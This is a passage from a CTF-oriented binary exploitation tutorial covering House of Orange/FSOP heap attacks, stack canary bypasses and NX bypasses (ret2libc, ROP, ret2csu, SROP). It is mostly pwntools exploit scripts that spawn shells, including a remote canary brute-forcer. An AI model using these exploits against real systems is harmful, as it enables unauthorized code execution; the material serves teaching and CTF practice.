# Write fake FILE structure
p.sendline(b'4')  # Write primitive
p.sendline(str(fake_file_addr).encode())
p.send(fake_file)

# Write fake vtable
p.sendline(b'4')
p.sendline(str(fake_vtable_addr).encode())
p.send(fake_vtable)

# =============== Step 7: Trigger FSOP ===============
# Cause abort() or exit() to call _IO_flush_all_lockp
p.sendline(b'5')  # Trigger malloc_printerr or direct abort

# _IO_flush_all_lockp iterates FILE structures
# Reaches our fake FILE
# Calls vtable->__overflow(fake_file, EOF)
# Which is system(fake_file)
# fake_file should contain "/bin/sh" at appropriate offset

p.interactive()
```

### Detailed Fake FILE Structure Setup

**Critical FILE structure constraints**:

```python
# For _IO_OVERFLOW to be called:
# 1. _mode <= 0
# 2. _IO_write_ptr > _IO_write_base

# For system("/bin/sh") to work:
# 3. First argument (FILE*) should point to "/bin/sh" or contain it

# Typical fake FILE layout:
fake_file = flat({
    0x0: 0xfbad1800,           # _flags
    0x8: 0,                     # _IO_read_ptr
    0x10: 0,                    # _IO_read_end
    0x18: 0,                    # _IO_read_base
    0x20: 0,                    # _IO_write_base (must be < write_ptr)
    0x28: 1,                    # _IO_write_ptr (must be > write_base)
    0x30: 0,                    # _IO_write_end
    0x38: binsh,                # _IO_buf_base (can contain /bin/sh)
    0x68: 0,                    # _chain (next FILE)
    0xc0: 0,                    # _mode (must be <= 0)
    0xd8: fake_vtable           # vtable pointer
}, filler=b'\x00')
```

**Alternative: Place "/bin/sh" at FILE address**:

```python
# system() is called with first argument = FILE pointer
# If FILE structure starts with "/bin/sh\x00", system gets correct argument

fake_file = b'/bin/sh\x00'    # First 8 bytes
fake_file += p64(0) * 2        # Padding
fake_file += p64(0)            # _IO_write_base = 0
fake_file += p64(1)            # _IO_write_ptr = 1 (> write_base)
fake_file += p64(0) * ((0xd8 - 0x30) // 8)  # Padding to vtable offset
fake_file += p64(fake_vtable)  # vtable
```

### Vtable Hijacking Techniques

**Traditional vtable overwrite**:

```python
# Overwrite FILE->vtable to point to controlled memory
# Place fake vtable with system address at __overflow offset

fake_vtable = p64(0) * 2      # __dummy
fake_vtable += p64(0)          # __finish
fake_vtable += p64(libc.sym['system'])  # __overflow
```

**Vtable validation bypass** (glibc >= 2.24):

```c
// Modern glibc validates vtable is in valid range
if (!_IO_vtable_check(fp->vtable)) {
    _IO_vtable_check_error();
}

// Check implementation:
bool _IO_vtable_check(struct _IO_jump_t *vtable) {
    return (vtable >= _IO_vtable_start && vtable < _IO_vtable_end);
}
```

**Bypass options**:

1. **Use legitimate vtable with helpful gadgets**:

```python
# _IO_str_jumps contains __overflow = _IO_str_overflow
# Can be exploited if we control string buffer

fake_file[0xd8] = libc.sym['_IO_str_jumps']
# Setup appropriate fields for _IO_str_overflow exploitation
```

2. **Use _IO_wfile_jumps**:

```python
# Wide character FILE operations have different vtables
# May have exploitable functions

fake_file[0xd8] = libc.sym['_IO_wfile_jumps']
```

3. **Target _IO_FILE_plus** structure:

```python
# _IO_FILE_plus includes vtable as part of structure
# Can potentially bypass vtable range checks

struct _IO_FILE_plus {
    _IO_FILE file;
    const struct _IO_jump_t *vtable;
};
```

### House of Orange Variations

**House of Orange 2.0** (for glibc >= 2.24):

```python
# Use _IO_str_jumps and _IO_str_overflow
# _IO_str_overflow can trigger memcpy with controlled dest/src

fake_file = flat({
    0x0: 0,                     # _flags (no magic needed for str)
    0x20: 0,                    # _IO_write_base
    0x28: 1,                    # _IO_write_ptr
    0x38: binsh_addr,           # _IO_buf_base
    0x40: binsh_addr + 0x100,   # _IO_buf_end
    0x68: 0,                    # _chain
    0xd8: libc.sym['_IO_str_jumps'],  # Valid vtable
    0xe0: target_addr,          # _s._allocate_buffer (called if conditions met)
})

# When _IO_str_overflow is called:
# - Checks _IO_buf_end - _IO_buf_base
# - Calls _s._allocate_buffer(size) if needed
# - Can redirect to system or one_gadget
```

**House of Orange + House of Roman**:

Combines FSOP with other primitives for more complex exploitation chains.

### Complete Exploitation Script

```python
from pwn import *

def exploit():
    # Setup
    p = process('./vuln')
    elf = ELF('./vuln')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    # Helper functions
    def add(size, data=b''):
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'Size: ', str(size).encode())
        if data:
            p.sendafter(b'Data: ', data)
    
    def show(idx):
        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b'Index: ', str(idx).encode())
        return p.recvline()
    
    def edit(idx, data):
        p.sendlineafter(b'> ', b'3')
        p.sendlineafter(b'Index: ', str(idx).encode())
        p.sendafter(b'Data: ', data)
    
    # Step 1: Leak libc
    add(0x1000, b'A' * 8)
    add(0x10, b'guard')  # Prevent consolidation
    
    edit(0, b'A' * 0x1000)  # Clear data, leaks will appear
    leak_data = show(0)
    libc_leak = u64(leak_data[8:16])
    libc.address = libc_leak - 0x3c4b78
    
    log.success(f"Libc base: {hex(libc.address)}")
    
    # Step 2: Corrupt top chunk
    payload = b'A' * 0x1000
    payload += p64(0)         # prev_size
    payload += p64(0xe01)     # Fake top size (page-aligned, smaller)
    edit(0, payload)
    
    # Step 3: Force top chunk into unsorted bin
    add(0x2000)  # Larger than fake top
    
    # Step 4: Unsorted bin attack on _IO_list_all
    io_list_all = libc.sym['_IO_list_all']
    main_arena = libc.sym['__malloc_hook'] + 0x10
    unsorted_bin = main_arena + 88
    
    # Calculate heap address (leaked earlier or from known offsets)
    heap_base = libc_leak - 0x1000  # Adjust based on actual offset
    fake_file_addr = heap_base + 0x10
    
    # Corrupt unsorted bin bk
    payload = b'A' * 0x1000
    payload += p64(0)                        # prev_size
    payload += p64(0xe01)                    # size
    payload += p64(unsorted_bin)             # fd (original)
    payload += p64(io_list_all - 0x10)       # bk (corrupted)
    edit(0, payload)
    
    # Trigger unsorted bin attack
    add(0x1000)
    
    log.success(f"Unsorted bin attack completed")
    log.info(f"_IO_list_all now points to: {hex(unsorted_bin)}")
    
    # Step 5: Craft fake FILE structure
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    
    # Fake vtable (in heap)
    fake_vtable_addr = fake_file_addr + 0x200
    fake_vtable = p64(0) * 2                 # dummy
    fake_vtable += p64(0)                     # __finish
    fake_vtable += p64(system)                # __overflow -> system
    
    # Fake FILE structure
    fake_file = p64(0x61)                     # Fake chunk size (for unsorted bin)
    fake_file += b'/bin/sh\x00'               # FILE starts with /bin/sh
    fake_file += p64(0) * 2                   # read pointers
    fake_file += p64(0)                       # _IO_write_base = 0
    fake_file += p64(0xffffffff)              # _IO_write_ptr = large
    fake_file += p64(0) * 2                   # write_end, buf_base
    fake_file += p64(0)                       # buf_end
    fake_file += p64(0) * 4                   # padding
    fake_file += p64(0)                       # _chain = NULL
    fake_file += p64(0) * 6                   # padding
    fake_file += p64(fake_vtable_addr)        # vtable pointer
    
    # Write fake structures
    edit(0, fake_file + fake_vtable)
    
    log.success("Fake FILE and vtable created")
    
    # Step 6: Trigger FSOP
    # Various methods:
    # - Invalid free (malloc_printerr)
    # - Stack overflow (abort)
    # - Direct exit call
    
    p.sendlineafter(b'> ', b'4')  # Trigger error condition
    
    # Shell should spawn
    p.interactive()

if __name__ == '__main__':
    exploit()
```

### Debugging House of Orange

**GDB examination**:

```bash
# Check _IO_list_all
p _IO_list_all
p *_IO_list_all

# Examine FILE structure
p *(struct _IO_FILE*)0x7ffff7dd2540

# Check vtable
x/10gx ((struct _IO_FILE*)0x7ffff7dd2540)->vtable

# Set breakpoint on _IO_flush_all_lockp
b _IO_flush_all_lockp

# Set breakpoint on __overflow call
b *(_IO_list_all->vtable + 0x18)

# Examine unsorted bin
p main_arena.bins[0]
x/10gx &main_arena.bins[0]
```

**Heap state verification**:

```bash
# pwndbg commands
bins
heap
vis_heap_chunks

# Check if top chunk is in unsorted bin
unsortedbin
# Should show old top chunk

# Verify _IO_list_all pointer
x/gx &_IO_list_all
```

### Common Pitfalls and Fixes

**Issue 1: Top chunk size validation failure**

```python
# Problem: Size not page-aligned
fake_size = 0xf00  # Wrong - not page-aligned

# Fix: Ensure page alignment (0x1000 boundary)
fake_size = 0x1000  # Correct
fake_size |= 1      # Add PREV_INUSE flag
```

**Issue 2: _IO_OVERFLOW not called**

```python
# Problem: Conditions not met
# _IO_write_ptr must be > _IO_write_base

# Fix:
fake_file[0x20] = 0           # _IO_write_base = 0
fake_file[0x28] = 0xffffffff  # _IO_write_ptr = large value
```

**Issue 3: Vtable check fails (glibc >= 2.24)**

```python
# Problem: Fake vtable outside valid range

# Fix: Use legitimate vtable
fake_file[0xd8] = libc.sym['_IO_str_jumps']
# And setup corresponding FILE fields for _IO_str_overflow
```

**Issue 4: System call fails**

```python
# Problem: First argument not pointing to "/bin/sh"

# Fix: Place "/bin/sh" at FILE structure start
fake_file = b'/bin/sh\x00' + p64(0) * 10  # ...
# Or adjust _IO_buf_base to point to "/bin/sh"
```

### Modern Protections and Bypasses

**Vtable readonly protection** (glibc >= 2.27):

- Vtables are in readonly memory
- Cannot corrupt vtable contents directly
- Must use existing vtables with exploitable functions

**Pointer mangling** (glibc >= 2.32):

- Function pointers are encrypted
- Need to leak pointer guard value
- XOR with guard to get real pointer

**House of Kiwi** (modern alternative):

- Targets _IO_helper_jumps
- Uses _IO_cookie_jumps
- Bypasses modern protections

**[Inference]**: House of Orange effectiveness decreases with newer glibc versions due to additional hardening. Alternative FSOP techniques like House of Kiwi or House of Emma may be more suitable for recent glibc versions (>= 2.28).

This comprehensive coverage of House of Force, House of Spirit, House of Lore, and House of Orange provides the theoretical foundation and practical exploitation techniques needed for advanced heap exploitation in CTF challenges. Each technique requires careful adaptation to the specific target environment and glibc version.

---

# Protection Mechanisms

## Stack Canaries (SSP - Stack Smashing Protection)

### Mechanism Overview

**Concept:** Random value (canary) placed between local variables and saved return address. Checked before function return to detect stack corruption.

**Stack Layout with Canary:**

```
High Memory
┌──────────────────┐
│ Function args    │
├──────────────────┤
│ Return address   │ ← Protected by canary
├──────────────────┤
│ Saved RBP        │
├──────────────────┤
│ Stack canary     │ ← Random value (ends with \x00)
├──────────────────┤ ← RBP points here
│ Local variables  │
│ buffer[64]       │
└──────────────────┘
Low Memory
```

**Canary Structure:**

- **32-bit:** 4 bytes, LSB is `\x00` (null byte)
- **64-bit:** 8 bytes, LSB is `\x00`
- Stored in TLS (Thread Local Storage): `fs:0x28` (64-bit) or `gs:0x14` (32-bit)
- Generated at program startup (random per execution)

**Assembly Implementation:**

```nasm
; Function prologue (64-bit)
push    rbp
mov     rbp, rsp
sub     rsp, 0x50               ; Allocate locals
mov     rax, qword ptr fs:[0x28] ; Load canary from TLS
mov     qword ptr [rbp-8], rax  ; Store on stack

; ... function body ...

; Function epilogue
mov     rax, qword ptr [rbp-8]  ; Load stored canary
xor     rax, qword ptr fs:[0x28] ; Compare with original
je      .L_good                  ; If equal, no corruption
call    __stack_chk_fail         ; Otherwise, abort

.L_good:
leave
ret
```

### Detection Methods

**Static Analysis:**

```bash
# Check if binary has SSP
checksec --file=./binary
# Output: CANARY: Canary found / No canary found

# Using readelf
readelf -s ./binary | grep stack_chk
# Look for: __stack_chk_fail, __stack_chk_guard

# Disassemble to see canary operations
objdump -d ./binary -M intel | grep 'fs:0x28'
objdump -d ./binary -M intel | grep 'gs:0x14'

# Check for stack_chk_fail calls
objdump -d ./binary | grep stack_chk_fail
```

**Dynamic Analysis:**

```bash
gdb ./binary

# Break at function with buffer
break vulnerable_function
run

# Examine stack for canary
x/40gx $rsp  # 64-bit
x/40wx $esp  # 32-bit

# Canary typically looks like: 0xXXXXXXXXXXXXXX00
# Find value ending in 00, near saved RBP

# View canary value from TLS
x/gx $fs_base+0x28  # 64-bit
x/wx $gs_base+0x14  # 32-bit

# Or with pwndbg/GEF
canary

# Step through to see check
break *vulnerable_function+XXX  # Address before return
continue
disass
```

**Runtime Identification:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./binary')

# Send overflow to trigger canary check
payload = b"A" * 200
p.sendline(payload)

response = p.recvall()

if b"stack smashing detected" in response:
    log.info("Stack canary is enabled")
else:
    log.info("No stack canary detected")

p.close()
```

### Bypass Techniques

#### Bypass Method 1: Leak Canary

**Using Format String Vulnerability:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
binary = './canary_binary'

p = process(binary)

# Find canary position on stack (ends with 00)
# Method 1: Manual search
for i in range(1, 30):
    test = process(binary, level='error')
    test.sendline(f"%{i}$p".encode())
    resp = test.recvline()
    test.close()
    
    if b'00\n' in resp:  # Canary ends with null byte
        log.info(f"Potential canary at offset {i}: {resp}")

# Assume canary at offset 7
p.sendline(b"%7$p")
leak = p.recvline().strip()
canary = int(leak, 16)

log.success(f"Leaked canary: {hex(canary)}")

# Build overflow payload preserving canary
offset_to_canary = 72  # Distance to canary
offset_to_rip = 88     # Distance to return address

payload = b"A" * offset_to_canary
payload += p64(canary)          # Preserve canary
payload += b"B" * 8             # Saved RBP
payload += p64(0x401234)        # Overwrite RIP

p.sendline(payload)
p.interactive()
```

**Using Information Leak (Stack Read):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('./leak_canary')

# If binary has stack read vulnerability
# e.g., read(buffer, size) then write(buffer, size)

# Send read request
p.sendline(b"READ")
leaked_data = p.recv(100)

# Parse canary from leaked stack data
# Canary at known offset from buffer
canary_offset = 72
canary = u64(leaked_data[canary_offset:canary_offset+8])

log.success(f"Leaked canary: {hex(canary)}")

# Use in overflow
p.sendline(b"OVERFLOW")
payload = b"A" * 72
payload += p64(canary)
payload += p64(0xdeadbeef) * 2  # RBP + RIP

p.sendline(payload)
p.interactive()
```

**Using Partial Overwrite (Avoiding Canary):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# If we only need to overwrite saved RBP or adjacent data
# Strategy: Stop overflow before canary

p = process('./partial_overflow')

# Overwrite local variables/pointers but not canary
payload = b"A" * 60  # Stop before canary at 72

# Or: Overwrite function pointers on heap/data section
# If stack has pointers to writable memory with function pointers

p.sendline(payload)
p.interactive()
```

#### Bypass Method 2: Brute Force Canary (32-bit, Forking Servers)

**Concept:** Brute force canary byte-by-byte on servers that fork (canary stays same across forks).

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def check_byte(known_canary, test_byte):
    """
    Check if test_byte is correct next byte of canary
    Returns True if no crash, False if crash
    """
    try:
        p = remote('target', 1337, timeout=2)
        
        # Send payload up to and including test_byte
        payload = b"A" * 64  # Fill buffer to canary
        payload += known_canary + bytes([test_byte])
        
        p.sendline(payload)
        response = p.recvall(timeout=1)
        p.close()
        
        # If no "stack smashing" message, byte is correct
        return b"stack smashing" not in response
    except:
        return False

# Brute force canary (32-bit example)
canary = b"\x00"  # First byte always null (little-endian)

for byte_pos in range(3):  # 3 more bytes (4 total for 32-bit)
    for byte_val in range(256):
        if check_byte(canary, byte_val):
            canary += bytes([byte_val])
            log.info(f"Found byte {byte_pos+1}: {hex(byte_val)}")
            break
    else:
        log.error(f"Could not find byte {byte_pos+1}")
        exit(1)

log.success(f"Full canary: {canary.hex()}")

# Now use canary in real exploit
p = remote('target', 1337)

payload = b"A" * 64
payload += canary
payload += p32(0xdeadbeef)  # Saved EBP
payload += p32(0x08048100)  # Return address

p.sendline(payload)
p.interactive()
```

**64-bit Brute Force (Slower, 7 bytes):**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def brute_force_canary_64():
    """Brute force 64-bit canary (7 random bytes + 1 null)"""
    
    canary = b"\x00"  # LSB is always null
    
    for byte_pos in range(7):
        found = False
        for byte_val in range(256):
            try:
                p = remote('target', 1337, timeout=1)
                
                payload = b"A" * 88  # Offset to canary
                payload += canary + bytes([byte_val])
                
                p.sendline(payload)
                resp = p.recvall(timeout=1)
                p.close()
                
                if b"stack smashing" not in resp:
                    canary += bytes([byte_val])
                    log.info(f"Byte {byte_pos}: {hex(byte_val)}")
                    found = True
                    break
            except:
                continue
        
        if not found:
            log.error(f"Failed at byte {byte_pos}")
            return None
    
    return canary

# This takes ~1792 attempts on average (256 * 7)
canary = brute_force_canary_64()
log.success(f"Canary: {canary.hex()}")
```

#### Bypass Method 3: Overwrite __stack_chk_fail GOT Entry

**Concept:** Overwrite GOT entry for `__stack_chk_fail` to prevent abort on canary mismatch.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './canary_partial_relro'
elf = ELF(binary)

# Requires: Partial RELRO + Format string or arbitrary write

p = process(binary)

# Find __stack_chk_fail GOT entry
stack_chk_fail_got = elf.got['__stack_chk_fail']

# Overwrite with address we control
# Option 1: Overwrite with ret instruction (just return)
ret_gadget = 0x401234  # Find with: ROPgadget --binary ./binary --only "ret"

# Option 2: Overwrite with win function
win_addr = elf.symbols['win']

# Using format string to overwrite
offset = 6  # Format string buffer offset

exploit = FormatStringExploit(offset=offset, arch='amd64')
exploit.add_write(stack_chk_fail_got, win_addr, size=8)

payload = exploit.generate_payload()
p.sendline(payload)

# Now trigger canary check - will call win() instead of abort
p.sendline(b"A" * 200)  # Overflow with wrong canary

p.interactive()
```

#### Bypass Method 4: Thread Local Storage (TLS) Overwrite

**Concept:** Overwrite canary at its source (TLS) before comparison.

**Requirements:**

- Write primitive to TLS region
- Knowledge of TLS base address

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

p = process('./tls_vuln')

# Leak TLS base (fs_base)
# Method: Leak via /proc/self/maps or auxiliary vector

# If we can read /proc/self/maps
p.sendline(b"leak_maps")
maps = p.recvuntil(b"[stack]")

# Find [vvar] or fs segment
# Example: 7ffff7fc9000-7ffff7fcb000 r--p ... [vvar]

# Calculate fs:0x28 location
fs_base = 0x7ffff7fc9000  # Example
canary_location = fs_base + 0x28

# Overwrite canary at TLS with our known value
known_canary = 0x4141414141414100

# Using arbitrary write vulnerability
p.sendline(b"write")
p.sendline(p64(canary_location))
p.sendline(p64(known_canary))

# Now overflow with our known canary
payload = b"A" * 72
payload += p64(known_canary)
payload += p64(0xdeadbeef) * 2

p.sendline(payload)
p.interactive()
```

### Canary Bypass in Specific Scenarios

**Scenario 1: Fork-based Server (Canary Persistent)**

```python
# Canary remains same across fork()
# Strategy: Brute force once, reuse for all connections
```

**Scenario 2: Multi-threaded Application**

```python
# Each thread may have different canary
# Strategy: Attack single thread consistently, or leak per-thread
```

**Scenario 3: Canary with ASLR/PIE**

```python
# Canary randomized per execution, addresses randomized
# Strategy: Leak both canary and addresses in same connection
```

**Scenario 4: Stack Overflow Without Canary Check Bypass**

```python
# If we can't bypass canary:
# - Overwrite adjacent variables (function pointers, file pointers)
# - Heap spray then overwrite stack pointer to heap
# - Use partial overwrites on non-canary values
```

### Stack Canary Detection in Binaries

**Compilation Flags:**

```bash
# Enable SSP
gcc -fstack-protector source.c -o binary
# Protects functions with buffers > 8 bytes

gcc -fstack-protector-all source.c -o binary
# Protects all functions

gcc -fstack-protector-strong source.c -o binary
# Protects functions with buffers, arrays, or address-taken locals

# Disable SSP
gcc -fno-stack-protector source.c -o binary
```

**Checking Protection Level:**

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./binary')

# Check for stack canary symbols
canary_symbols = [
    '__stack_chk_fail',
    '__stack_chk_guard',
    '__stack_chk_fail_local'
]

for sym in canary_symbols:
    if sym in elf.symbols:
        log.info(f"Found canary symbol: {sym}")

# Check relocations
if '__stack_chk_fail' in [r.name for r in elf.relocs]:
    log.success("Stack canary is enabled")
```

## Non-Executable Stack (NX/DEP)

### Mechanism Overview

**Concept:** Memory pages marked as either writable OR executable, not both. Prevents shellcode execution on stack/heap.

**Memory Permissions:**

```
Text Segment:   r-x (read, execute)
Data Segment:   rw- (read, write)
Stack:          rw- (read, write) with NX
Heap:           rw- (read, write) with NX

Without NX:
Stack:          rwx (read, write, execute)
```

**Implementation:**

- **Linux:** NX bit in page tables (PAE/64-bit), GNU_STACK segment
- **Windows:** DEP (Data Execution Prevention)
- **Hardware:** NX bit in page table entries (AMD), XD bit (Intel)

### Detection Methods

**Static Analysis:**

```bash
# Using checksec
checksec --file=./binary
# Output: NX: NX enabled / NX disabled

# Using readelf
readelf -l ./binary | grep GNU_STACK
# GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
# RWE = No NX (stack is executable)
# RW  = NX enabled (stack is NOT executable)

# Using objdump
objdump -p ./binary | grep STACK
# STACK off    0x0000000000000000 vaddr 0x0000000000000000 ...
# flags rw-    ← NX enabled
# flags rwx    ← NX disabled

# Check if PT_GNU_STACK segment exists
readelf -l ./binary | grep -A 1 GNU_STACK
```

**Checking at Runtime:**

```bash
# View memory mappings
cat /proc/$PID/maps

# Example output with NX:
# 7ffffffde000-7ffffffff000 rw-p ... [stack]    ← rw- = not executable

# Without NX:
# bffeb000-c0000000 rwxp ... [stack]    ← rwxp = executable

# In GDB
info proc mappings
# Check permissions column for stack
```

**Kernel-Level Check:**

```bash
# Check if NX is supported by CPU
grep -i nx /proc/cpuinfo

# Check kernel NX support
dmesg | grep NX
```

### Bypass Techniques

#### Bypass Method 1: Return-to-libc (ret2libc)

**Concept:** Return to existing code in libc instead of injected shellcode.

**32-bit ret2libc:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

binary = './nx_binary32'
elf = ELF(binary)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p = process(binary)

# Find addresses (no ASLR for now)
system_addr = libc.symbols['system']
exit_addr = libc.symbols['exit']
bin_sh_addr = next(libc.search(b'/bin/sh'))

log.info(f"system @ {hex(system_addr)}")
log.info(f"exit @ {hex(exit_addr)}")
log.info(f"/bin/sh @ {hex(bin_sh_addr)}")

offset = 112  # Offset to return address

# Stack layout after overflow:
# [system_addr][exit_addr][bin_sh_addr]
# Calls: system("/bin/sh")
# Then: exit() (if system returns)

payload = b"A" * offset
payload += p32(system_addr)
payload += p32(exit_addr)    # Fake return address
payload += p32(bin_sh_addr)  # Argument to system

p.sendline(payload)
p.interactive()
```

**64-bit ret2libc (requires ROP for arguments):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './nx_binary64'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Find gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))

offset = 120

# ROP chain:
# pop rdi; ret     ← Load /bin/sh address into RDI
# /bin/sh address
# system address   ← Call system(rdi)

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### Bypass Method 2: Return-Oriented Programming (ROP)

**Concept:** Chain small code snippets (gadgets) ending in `ret` to build arbitrary functionality.

**Finding Gadgets:**

```bash
# Using ROPgadget
ROPgadget --binary ./binary

# Find specific gadgets
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --only "mov|ret"

# Search in libc
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi

# Using ropper
ropper --file ./binary
ropper --file ./binary --search "pop rdi"

# Common useful gadgets:
# pop rdi; ret         - Set first argument (x64)
# pop rsi; ret         - Set second argument (x64)
# pop rdx; ret         - Set third argument (x64)
# pop rax; ret         - Set syscall number
# syscall; ret         - Make syscall
# int 0x80; ret        - Make syscall (x86)
```

**Building ROP Chain:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './rop_binary'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Manual gadget finding
pop_rdi = 0x401234  # pop rdi; ret
pop_rsi = 0x401236  # pop rsi; ret
pop_rdx = 0x401238  # pop rdx; ret
pop_rax = 0x40123a  # pop rax; ret
syscall_ret = 0x40123c  # syscall; ret

# Or use pwntools ROP
rop = ROP(elf)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])

payload = b"A" * 120
payload += rop.chain()

p.sendline(payload)
p.interactive()
```

**execve Syscall via ROP (x64):**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Gadgets (from binary or libc)
pop_rdi = 0x401234
pop_rsi = 0x401236
pop_rdx = 0x401238
pop_rax = 0x40123a
syscall_ret = 0x40123c

# Data
bin_sh_addr = 0x402000  # Location of "/bin/sh" string in binary
# Or use writable memory and write string there first

offset = 120

# Build ROP chain for: execve("/bin/sh", NULL, NULL)
# rax = 59 (sys_execve)
# rdi = "/bin/sh" address
# rsi = NULL
# rdx = NULL

payload = b"A" * offset

# Set up registers
payload += p64(pop_rax)
payload += p64(59)              # sys_execve

payload += p64(pop_rdi)
payload += p64(bin_sh_addr)     # arg1: filename

payload += p64(pop_rsi)
payload += p64(0)               # arg2: argv = NULL

payload += p64(pop_rdx)
payload += p64(0)               # arg3: envp = NULL

payload += p64(syscall_ret)     # Execute syscall

p = process('./binary')
p.sendline(payload)
p.interactive()
```

**Write String to Memory via ROP:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Gadgets
pop_rdi = 0x401234
pop_rsi = 0x401236
pop_rdx = 0x401238
mov_rdi_rsi = 0x40123a  # mov qword [rdi], rsi; ret

# Writable memory location
writable_addr = 0x601000  # .bss or .data segment

offset = 120

payload = b"A" * offset

# Write "/bin/sh\x00" to writable_addr
# /bin = 0x6e69622f
# /sh\x00 = 0x0068732f

payload += p64(pop_rdi)
payload += p64(writable_addr)

payload += p64(pop_rsi)
payload += b"/bin/sh\x00"  # This goes on stack, then moved

payload += p64(mov_rdi_rsi)  # Write to memory

# Now call system(writable_addr)
# ... rest of ROP chain ...
```

**Automated ROP with pwntools:**

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './binary'
elf = context.binary
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(elf.path)

# Automatic ROP chain generation
rop = ROP(elf)

# Call system("/bin/sh")
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])

log.info(rop.dump())

payload = fit({120: rop.chain()})

p.sendline(payload)
p.interactive()
```

#### Bypass Method 3: ret2plt / ret2got

**Concept:** Return to PLT (Procedure Linkage Table) entries to call libc functions.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

binary = './plt_binary'
elf = ELF(binary)

# Binary has system@plt even if not explicitly called
# Or use another function and chain

p = process(binary)

# Find PLT and GOT
system_plt = elf.plt['system']  # Or another function
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# If binary has "/bin/sh" string
bin_sh = next(elf.search(b'/bin/sh'))

# Or find in data section
data_section = elf.get_section_by_name('.data').header['sh_addr']

offset = 112

# Simple call: system("/bin/sh") via PLT
payload = b"A" * offset
payload += p32(system_plt)
payload += p32(0xdeadbeef)  # Fake return
payload += p32(bin_sh)

p.sendline(payload)
p.interactive()
```

**ret2plt for Leaking Addresses:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './leak_binary'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# Stage 1: Leak libc address via puts
pop_rdi = 0x401234
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 120

# ROP chain: puts(puts@GOT) then return to main
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)  # Return to main for stage 2

p.sendline(payload)

# Read leaked address
p.recvuntil(b"A" * offset)
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))

libc_base = leaked_puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

log.success(f"Libc base: {hex(libc_base)}")

# Stage 2: Call system("/bin/sh")
payload2 = b"A" * offset
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

#### Bypass Method 4: ret2csu

**Concept:** Use `__libc_csu_init` gadgets present in most binaries to control registers.

**__libc_csu_init Gadgets:**

```nasm
; Gadget 1 (sets up registers)
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; Gadget 2 (calls function)
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword ptr [r12 + rbx*8]
```

**Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './csu_binary'
elf = ELF(binary)

# Find __libc_csu_init gadgets
csu_pop = 0x40123a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x401220  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

# Target function (e.g., from GOT or known address)
target_func = elf.got['read']  # Or any function pointer

offset = 120

payload = b"A" * offset

# Use csu gadgets to call read(0, bss_addr, large_size)
# Then write shellcode to bss and jump to it
# Or use to set up syscall arguments

# Setup registers:
payload += p64(csu_pop)
payload += p64(0)           # rbx = 0
payload += p64(1)           # rbp = 1 (loop counter)
payload += p64(target_func) # r12 = function to call
payload += p64(0)           # r13 = rdi (arg1)
payload += p64(0x601000)    # r14 = rsi (arg2)
payload += p64(100)         # r15 = rdx (arg3)

payload += p64(csu_call)    # Execute call

p = process(binary)
p.sendline(payload)
p.interactive()
```

#### Bypass Method 5: SROP (Sigreturn-Oriented Programming)

**Concept:** Use `sigreturn` syscall to set all registers at once, including RIP.

**Requirements:**

- syscall or int 0x80 gadget
- Way to set RAX to 15 (sigreturn syscall number on x64)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary = './srop_binary'
elf = ELF(binary)

syscall_ret = 0x401234  # syscall; ret gadget

offset = 120

# Build sigreturn frame
frame = SigreturnFrame()
